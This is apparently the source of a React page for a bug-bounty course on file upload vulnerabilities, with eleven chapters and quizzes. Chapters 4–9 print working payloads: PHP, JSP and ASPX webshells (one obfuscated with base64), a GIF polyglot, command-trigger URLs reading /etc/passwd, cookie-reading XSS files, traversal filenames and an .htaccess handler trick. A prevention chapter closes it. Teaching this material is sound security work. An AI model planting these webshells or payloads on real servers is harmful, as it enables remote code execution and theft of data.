import React, { useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./FileUpload.css";

const chapters = [
  // ====================== 01 What is File Upload Vuln? ======================
  {
    id: "what-is-file-upload",
    title: "01 What is File Upload Vuln?",
    content: (
      <>
        <h2>What is Unrestricted File Upload?</h2>
        <p>
          Unrestricted File Upload is a vulnerability that occurs when an
          application allows users to upload files without proper validation of
          file type, content, size, or storage location. Attackers can upload
          malicious files (webshells, scripts, HTML, SVG) that lead to Remote
          Code Execution, XSS, or other impacts.
        </p>
        <p>
          It is a high-impact finding in bug bounty programs because a single
          successful upload can result in full server compromise.
        </p>
        <h3>How File Upload Attacks Work</h3>
        <ol>
          <li>Application accepts a file from the user.</li>
          <li>Validation of extension, MIME type, or content is missing or weak.</li>
          <li>File is stored in a web-accessible directory or processed unsafely.</li>
          <li>Attacker uploads a malicious file (PHP, JSP, ASPX, HTML, SVG, etc.).</li>
          <li>Attacker accesses or triggers the file to achieve RCE, XSS, or data theft.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            File Upload vuln = Uploading malicious files due to weak or missing
            validation, often leading to RCE or XSS.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main danger of Unrestricted File Upload?",
      options: [
        "It only slows down the website",
        "Attackers can upload malicious files leading to RCE or XSS",
        "It only affects image files",
        "Files are automatically deleted after upload"
      ],
      correct: "Attackers can upload malicious files leading to RCE or XSS",
    },
  },

  // ====================== 02 Impact & Attack Goals ======================
  {
    id: "impact",
    title: "02 Impact & Attack Goals",
    content: (
      <>
        <h2>Impact of File Upload Vulnerabilities</h2>
        <h3>High Impact Outcomes</h3>
        <ul>
          <li><strong>Remote Code Execution (RCE)</strong> – Upload a webshell and execute system commands.</li>
          <li><strong>Cross-Site Scripting (XSS)</strong> – Upload HTML/JS/SVG that executes in other users’ browsers.</li>
          <li><strong>Server-Side Request Forgery / XXE</strong> – Via crafted SVG, XML, or document files.</li>
          <li><strong>Phishing / Content Spoofing</strong> – Host malicious pages on the trusted domain.</li>
          <li><strong>Storage exhaustion / DoS</strong> – Upload huge files repeatedly.</li>
          <li><strong>Malware distribution</strong> – Host malware on the application domain.</li>
        </ul>
        <h3>Why It’s Critical</h3>
        <p>
          A successful webshell upload often means complete control of the
          application server, access to databases, secrets, and internal network.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Primary goals: RCE via webshell, stored XSS, and hosting malicious
            content on a trusted domain.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is usually the highest impact of a successful file upload attack?",
      options: [
        "Slightly slower page load",
        "Remote Code Execution (RCE) via webshell",
        "Only visual defacement",
        "Temporary account lockout"
      ],
      correct: "Remote Code Execution (RCE) via webshell",
    },
  },

  // ====================== 03 Types of Validation ======================
  {
    id: "validation-types",
    title: "03 Types of Validation",
    content: (
      <>
        <h2>Types of File Upload Validation</h2>
        <h3>1. Client-Side Validation</h3>
        <p>
          JavaScript checks extension or MIME type in the browser. Easily
          bypassed by intercepting the request with a proxy (Burp).
        </p>
        <h3>2. Extension Blacklist</h3>
        <p>
          Server blocks known dangerous extensions (.php, .jsp, .aspx, etc.).
          Bypass with alternative extensions or double extensions.
        </p>
        <h3>3. Extension Whitelist</h3>
        <p>
          Only allows specific extensions (.jpg, .png, .pdf). Stronger, but
          still bypassable with polyglots or content-type tricks.
        </p>
        <h3>4. MIME Type / Content-Type Check</h3>
        <p>
          Checks the Content-Type header. Easily spoofed by changing the header.
        </p>
        <h3>5. Magic Bytes / File Signature</h3>
        <p>
          Checks the actual file content header (e.g., FF D8 FF for JPEG).
          Harder to bypass; requires polyglot files.
        </p>
        <h3>6. Content Scanning / Rewriting</h3>
        <p>
          Server re-encodes images or scans for malware. Best practice when done correctly.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Client-side and blacklist checks are weak. Prefer whitelist + magic
            bytes + content rewriting + store outside web root.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which validation method is considered the weakest?",
      options: [
        "Magic bytes check",
        "Extension whitelist",
        "Client-side validation only",
        "Server-side content rewriting"
      ],
      correct: "Client-side validation only",
    },
  },

  // ====================== 04 Extension Bypass Techniques ======================
  {
    id: "extension-bypass",
    title: "04 Extension Bypass Techniques",
    content: (
      <>
        <h2>Extension Bypass Techniques</h2>
        <h3>Double Extensions</h3>
        <pre className="payload-box">
{`shell.php.jpg
shell.php.png
shell.php.gif
shell.php%00.jpg          (null byte – older systems)
shell.php%0a.jpg`}
        </pre>
        <h3>Case Variation</h3>
        <pre className="payload-box">
{`shell.pHp
shell.PhP
shell.PHP
shell.pHP5
shell.Php7`}
        </pre>
        <h3>Alternative Extensions</h3>
        <pre className="payload-box">
{`PHP:  .php, .php3, .php4, .php5, .php7, .phtml, .pht, .phar
JSP:  .jsp, .jspx, .jsw, .jsv
ASP:  .asp, .aspx, .ashx, .asmx, .cer, .asa
Other: .shtml, .cgi, .pl, .py, .rb`}
        </pre>
        <h3>Special Characters & Tricks</h3>
        <pre className="payload-box">
{`shell.php.
shell.php...
shell.php;
shell.php%20
shell.php%0d%0a
shell.php::$DATA          (Windows Alternate Data Stream)
shell.php\\.jpg`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Try double extensions, case changes, alternate executable
            extensions, null bytes, and trailing special characters.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which of the following is a common extension bypass technique?",
      options: [
        "Using only lowercase letters",
        "Double extensions like shell.php.jpg",
        "Uploading files larger than 10MB",
        "Changing the HTTP method to GET"
      ],
      correct: "Double extensions like shell.php.jpg",
    },
  },

  // ====================== 05 Content-Type & Magic Bytes ======================
  {
    id: "content-type-bypass",
    title: "05 Content-Type & Magic Bytes",
    content: (
      <>
        <h2>Content-Type & Magic Bytes Bypass</h2>
        <h3>Content-Type Spoofing</h3>
        <p>
          Change the Content-Type header in the multipart request to an allowed type:
        </p>
        <pre className="payload-box">
{`Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf`}
        </pre>
        <h3>Magic Bytes (File Signatures)</h3>
        <pre className="payload-box">
{`JPEG:  FF D8 FF
PNG:   89 50 4E 47 0D 0A 1A 0A
GIF:   47 49 46 38
PDF:   25 50 44 46
ZIP:   50 4B 03 04`}
        </pre>
        <h3>Polyglot Files</h3>
        <p>
          A file that is both a valid image and a valid script. Example: GIF
          header + PHP code.
        </p>
        <pre className="payload-box">
{`GIF89a;
<?php system($_GET['cmd']); ?>`}
        </pre>
        <h3>Using Tools</h3>
        <ul>
          <li>Burp Suite – edit Content-Type and filename in Repeater</li>
          <li>Hex editor – prepend magic bytes to webshell</li>
          <li>Polyglot generators / custom scripts</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Spoof Content-Type and prepend valid magic bytes. Polyglot files
            bypass both extension and content checks in many cases.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is a polyglot file in the context of file upload attacks?",
      options: [
        "A file that is encrypted",
        "A file that is valid as both an image and a script",
        "A file larger than 50MB",
        "A file with no extension"
      ],
      correct: "A file that is valid as both an image and a script",
    },
  },

  // ====================== 06 Webshells & Payloads ======================
  {
    id: "webshells",
    title: "06 Webshells & Payloads",
    content: (
      <>
        <h2>Webshells & Common Payloads</h2>
        <h3>PHP Webshells</h3>
        <pre className="payload-box">
{`<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST['x']); ?>
<?php eval($_POST['code']); ?>
<?=\`$_GET[1]\`?>`}
        </pre>
        <h3>JSP Webshell</h3>
        <pre className="payload-box">
{`<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`}
        </pre>
        <h3>ASPX Webshell</h3>
        <pre className="payload-box">
{`<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start(Request["cmd"]); %>`}
        </pre>
        <h3>Minimal / Obfuscated</h3>
        <pre className="payload-box">
{`<?php \`$_GET[0]\`;?>
<?php eval(base64_decode($_GET['x'])); ?>
GIF89a;<?php system($_GET['cmd']);?>`}
        </pre>
        <h3>After Upload – Trigger</h3>
        <pre className="payload-box">
{`https://target.com/uploads/shell.php?cmd=id
https://target.com/uploads/shell.php?cmd=whoami
https://target.com/uploads/shell.php?cmd=cat+/etc/passwd`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Keep simple webshells ready for PHP, JSP, and ASPX. Always test
            execution after a successful upload.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "After successfully uploading a PHP webshell, what should you do next?",
      options: [
        "Delete the file immediately",
        "Request the file with a command parameter to test execution",
        "Change the file extension to .txt",
        "Ignore it and move to another vulnerability"
      ],
      correct: "Request the file with a command parameter to test execution",
    },
  },

  // ====================== 07 XSS via File Upload ======================
  {
    id: "xss-upload",
    title: "07 XSS via File Upload",
    content: (
      <>
        <h2>XSS via File Upload</h2>
        <p>
          Even when code execution is blocked, uploading HTML, SVG, or XML
          files can lead to stored XSS.
        </p>
        <h3>HTML File</h3>
        <pre className="payload-box">
{`<html>
<body>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
</body>
</html>`}
        </pre>
        <h3>SVG XSS</h3>
        <pre className="payload-box">
{`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
</svg>

<svg>
  <script>alert(1)</script>
</svg>`}
        </pre>
        <h3>XML / Other</h3>
        <pre className="payload-box">
{`<!-- XML with XSS or XXE -->
<?xml version="1.0"?>
<html>
  <script>alert(1)</script>
</html>`}
        </pre>
        <h3>Impact</h3>
        <ul>
          <li>Session hijacking via cookie theft</li>
          <li>Phishing pages on the trusted domain</li>
          <li>Keylogging / credential capture</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            If RCE is not possible, still test HTML/SVG uploads for stored XSS.
            Content-Type and Content-Disposition headers matter.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Even if RCE is not possible, what other high-impact issue can file upload still cause?",
      options: [
        "Only information disclosure",
        "Stored XSS via HTML or SVG files",
        "Automatic account deletion",
        "Database corruption"
      ],
      correct: "Stored XSS via HTML or SVG files",
    },
  },

  // ====================== 08 Path Traversal in Upload ======================
  {
    id: "path-traversal",
    title: "08 Path Traversal in Upload",
    content: (
      <>
        <h2>Path Traversal in File Upload</h2>
        <p>
          Sometimes the application uses the original filename in the storage
          path. An attacker can use directory traversal to write the file
          outside the intended upload folder.
        </p>
        <h3>Payloads</h3>
        <pre className="payload-box">
{`../../../var/www/html/shell.php
..\\..\\..\\inetpub\\wwwroot\\shell.aspx
....//....//....//shell.php
..%2f..%2f..%2fshell.php
%2e%2e%2f%2e%2e%2fshell.php`}
        </pre>
        <h3>Goals</h3>
        <ul>
          <li>Write webshell into a web-accessible directory</li>
          <li>Overwrite critical files (if permissions allow)</li>
          <li>Place file where it will be automatically executed or included</li>
        </ul>
        <h3>Testing</h3>
        <ol>
          <li>Upload with a normal name and note the stored path.</li>
          <li>Re-upload with traversal sequences in the filename.</li>
          <li>Check whether the file appears in parent directories.</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Always test the filename parameter for path traversal. It can turn
            a restricted upload into RCE.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main goal of using path traversal in a file upload?",
      options: [
        "Make the file smaller",
        "Write the file outside the intended upload directory",
        "Change the file Content-Type",
        "Encrypt the uploaded file"
      ],
      correct: "Write the file outside the intended upload directory",
    },
  },

  // ====================== 09 Advanced Techniques ======================
  {
    id: "advanced",
    title: "09 Advanced Techniques",
    content: (
      <>
        <h2>Advanced File Upload Techniques</h2>
        <h3>1. Race Conditions</h3>
        <p>
          Upload a .php file and request it before the server finishes
          validation or moves it (common in async processing).
        </p>
        <h3>2. ImageMagick / File Processing Bugs</h3>
        <p>
          Crafted images can trigger RCE or SSRF in libraries like ImageMagick
          (ImageTragick), Ghostscript, or LibreOffice converters.
        </p>
        <h3>3. ZIP / Archive Uploads</h3>
        <pre className="payload-box">
{`Upload a ZIP containing:
  ../../../shell.php
(Zip Slip vulnerability)`}
        </pre>
        <h3>4. .htaccess / Config Upload</h3>
        <pre className="payload-box">
{`# .htaccess to make .jpg executable as PHP
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg`}
        </pre>
        <h3>5. Put / Move Methods</h3>
        <p>
          Some servers allow HTTP PUT or WebDAV methods to upload files
          directly if misconfigured.
        </p>
        <h3>6. Metadata / EXIF Injection</h3>
        <p>
          Inject XSS or other payloads into image metadata that is later
          displayed without encoding.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Race conditions, archive path traversal, .htaccess, and processing
            library bugs expand the attack surface beyond simple extension checks.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is Zip Slip in the context of file uploads?",
      options: [
        "Uploading a very large ZIP file",
        "A path traversal vulnerability inside ZIP archives",
        "Encrypting files inside a ZIP",
        "Compressing images only"
      ],
      correct: "A path traversal vulnerability inside ZIP archives",
    },
  },

  // ====================== 10 Hunting Methodology ======================
  {
    id: "hunting",
    title: "10 Hunting Methodology",
    content: (
      <>
        <h2>File Upload Hunting Methodology</h2>
        <h3>Step-by-Step</h3>
        <ol>
          <li><strong>Find upload points</strong> – Profile pictures, documents, attachments, import features, chat files.</li>
          <li><strong>Intercept the request</strong> – Capture multipart form data in Burp.</li>
          <li><strong>Test basic bypasses</strong> – Change extension, Content-Type, filename.</li>
          <li><strong>Try polyglots & magic bytes</strong> – Valid image + script content.</li>
          <li><strong>Check storage location</strong> – Is the file web-accessible? Can you guess the URL?</li>
          <li><strong>Test execution</strong> – Request the uploaded file with a command parameter.</li>
          <li><strong>Test XSS</strong> – Upload HTML/SVG and open the file URL.</li>
          <li><strong>Test path traversal</strong> – Manipulate the filename.</li>
          <li><strong>Document impact</strong> – RCE, XSS, overwrite, etc.</li>
        </ol>
        <h3>Useful Tools</h3>
        <ul>
          <li>Burp Suite (Repeater, Intruder)</li>
          <li>Upload Scanner (Burp extension)</li>
          <li>Fuxploider / similar automated tools</li>
          <li>Hex editor for magic bytes</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Systematically test extension, Content-Type, content, path, and
            post-upload access for every upload feature.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the first step when hunting for file upload vulnerabilities?",
      options: [
        "Immediately upload a webshell",
        "Find all possible upload points in the application",
        "Change the Content-Type header first",
        "Look only for .php extensions"
      ],
      correct: "Find all possible upload points in the application",
    },
  },

  // ====================== 11 Prevention ======================
  {
    id: "prevention",
    title: "11 Prevention",
    content: (
      <>
        <h2>How to Prevent File Upload Vulnerabilities</h2>
        <ul>
          <li><strong>Whitelist allowed extensions</strong> – Only .jpg, .png, .pdf, etc. Never blacklist only.</li>
          <li>Validate file content using magic bytes / file signatures.</li>
          <li>Re-encode or re-process images and documents server-side.</li>
          <li>Generate a random filename; never trust the user-supplied name.</li>
          <li>Store files <strong>outside</strong> the web root.</li>
          <li>Serve files through a script that sets safe Content-Type and Content-Disposition (attachment).</li>
          <li>Disable script execution in the upload directory (server config).</li>
          <li>Limit file size and scan for malware when possible.</li>
          <li>Do not execute or include uploaded files in any way.</li>
          <li>Use a separate domain/subdomain for user content (reduces XSS impact).</li>
        </ul>
        <h3>Server Config Example (Apache)</h3>
        <pre className="payload-box">
{`# Inside upload directory
<Directory "/var/www/uploads">
  php_flag engine off
  RemoveHandler .php .phtml .php3
  Options -ExecCGI
</Directory>`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Whitelist + content validation + random names + store outside web
            root + no execution = strong defense against upload attacks.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is one of the strongest prevention techniques for file uploads?",
      options: [
        "Only use client-side validation",
        "Whitelist extensions + magic bytes check + store outside web root",
        "Allow all file types but scan later",
        "Use blacklist of dangerous extensions only"
      ],
      correct: "Whitelist extensions + magic bytes check + store outside web root",
    },
  },
];

const FileUpload = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState([]);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;

    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">File Upload</span>
          </h1>
          <p className="article-date">Interactive Deep Course • 2026</p>
        </div>
      </section>

      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/ORFAi1XPZwYA1yEp7zza/image.png"
          alt="File Upload Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x420/1a0b2e/a855f7?text=File+Upload";
          }}
        />
      </section>

      <section className="article-body">
        <div className="article-container">
          <aside className="article-sidebar">
            <h3>Course Content</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${activeChapter.id === chapter.id ? "active" : ""} ${
                    completedChapters.includes(chapter.id) ? "completed" : ""
                  }`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>
                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>
                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default FileUpload;